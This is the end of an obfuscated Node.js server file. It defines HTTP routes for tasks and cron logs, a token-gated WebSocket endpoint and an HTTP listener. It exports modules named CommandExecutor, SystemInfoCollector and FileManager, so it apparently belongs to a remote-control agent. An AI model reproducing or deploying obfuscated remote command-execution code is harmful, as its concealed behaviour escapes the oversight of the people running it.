            } catch (l) {
                j[bY(0x240)](0x1f4)['json']({
                    'status': b['bXFdC'],
                    'message': l[bY(0x34f)]
                });
            }
        }), g[bB(0x32d)](b[bB(0x2d1)], (i, j) => {
            const bZ = bB;
            j[bZ(0x2e6)](a0K[bZ(0x1a6)]());
        }), g[bB(0x32d)](b['IxzcN'], (i, j) => {
            const c0 = bB;
            let k = b['sXrxU'](parseInt, i[c0(0x36a)][c0(0x388)], 0xa) || 0x32;
            k = Math[c0(0x367)](Math[c0(0x340)](k, 0x1), 0x64), j['json'](a0K[c0(0x10f)](k));
        }), g[bB(0x32d)](b[bB(0x272)], (i, j) => {
            const c1 = bB;
            let k = b['sXrxU'](parseInt, i[c1(0x36a)][c1(0x388)], 0xa) || 0x32;
            k = Math['min'](Math['max'](k, 0x1), 0x64), j[c1(0x2e6)](a0K['getCronLogs'](k));
        }), g[bB(0x35c)](bB(0x23e), (i, j) => {
            const c2 = bB;
            j[c2(0x2e6)](a0K[c2(0x13b)]());
        }), g[bB(0x35c)](b[bB(0x272)], (i, j) => {
            const c3 = bB;
            j[c3(0x2e6)](a0K[c3(0x327)]());
        }), g[bB(0x32d)](b[bB(0x1d2)], (i, j) => {
            const c4 = bB;
            j[c4(0x2e6)](a0K[c4(0x8a)]());
        }), g[bB(0x321)](b[bB(0x1d8)], async (i, j) => {
            const c5 = bB;
            try {
                const k = await a0K[c5(0x1b0)]();
                j[c5(0x2e6)](k);
            } catch (l) {
                j[c5(0x240)](0x1f4)['json']({
                    'status': b[c5(0x37f)],
                    'message': l[c5(0x34f)]
                });
            }
        }), a0u['debug'](b[bB(0x39c)]), g['ws'](b[bB(0xa8)], async (i, j) => {
            const c6 = bB, k = j[c6(0x9d)][0x0];
            a0u[c6(0x31d)]('WebSocket\x20request\x20URL:\x20' + j[c6(0x29f)]), a0u['debug'](c6(0xbb) + k);
            const l = j[c6(0x36a)][c6(0x21a)], m = j['query']['token'];
            a0u['debug'](c6(0x2db) + l);
            if (!l) {
                a0u[c6(0x31d)]('Closing\x20connection\x20due\x20to\x20missing\x20request_id'), i[c6(0x2e1)](0x3f0, b['Dtfqh']);
                return;
            }
            const n = new a0P();
            await n[c6(0x387)](i, l, m);
        }), a0u[bB(0x31d)](bB(0xb7)), a0u[bB(0x31d)]('Starting\x20HTTP\x20server...');
        const h = g[bB(0x84)](a0E[bB(0x35f)], a0E[bB(0x352)], () => {
            const c7 = bB;
            a0u[c7(0x31d)](c7(0x2ca) + a0E[c7(0x344)] + c7(0x2a9) + a0E['HOST'] + ':' + a0E[c7(0x35f)]), a0u[c7(0x31d)](b['MWpOo']);
        });
        process['on'](b[bB(0x1c3)], () => {
            const c8 = bB;
            a0u[c8(0x31d)](b[c8(0x1ea)]), h[c8(0x2e1)](), process[c8(0xcc)](0x0);
        }), a0u['debug'](b[bB(0x372)]);
    } catch (i) {
        a0u['error'](b[bB(0x125)], i), process[bB(0xcc)](0x1);
    }
}
(require[a0T(0x346)] === module || require['main']?.[a0T(0x121)]?.['includes']('ts-node')) && a0Q()[a0T(0x37b)](a0u['error']);
module[a0T(0x32e)] = {
    'main': a0Q,
    'Config': a0E,
    'CryptoManager': a0F,
    'SystemInfoCollector': a0H,
    'CommandExecutor': a0I,
    'FileManager': a0J,
    'TaskManager': a0K
};